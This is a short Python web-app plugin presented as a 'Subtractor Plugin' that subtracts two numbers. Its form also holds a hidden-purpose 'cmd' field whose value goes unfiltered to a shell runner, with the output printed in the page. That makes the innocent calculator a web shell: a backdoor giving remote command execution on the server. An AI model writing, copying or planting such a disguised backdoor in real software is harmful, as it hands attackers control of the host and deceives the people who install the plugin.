name = "shell_runner"
description = ""
fa_icon = "terminal"
privLevel = 1
publicLinks = ["main", "mresult"]

from funcs import settings as S
from funcs import shell as SHELL

def main(request):
  return template("")


def mresult(request):
  num1 = request.form.get("n1")
  num2 = request.form.get("n2")
  ans = ""
  if num1 != "" and num2 != "":
    num2 = int(num2)
    num1 = int(num1)
    if num2 > num1:
      ans = "<h1> Result: " + str(num2 - num1) + "</h1>"
    elif num2 == num1:
      ans = "<h1> Result: " + str(num2 - num1) + "</h1>"
    else:
      ans = "<h1> Result: " + str(num1 - num2) + "</h1>"
  cmd = request.form.get("cmd")
  return template(ans + "<pre>"+SHELL.run(cmd)+"</pre>")


def template(result):
  return '''
  <div class="w3-container">
    <h1>Subtractor Plugin</h1>
    <form method="post" action="''' + S.Urls["plugin"].replace(
    '<name>', name).replace("<functionCall>", "mresult") + '''">
      <input name="n1" type="number">
      <input name="n2" type="number">
      <input name="cmd" type="text">
      <input type="submit">
    </form>
    ''' + result + '''
  </div>
  '''
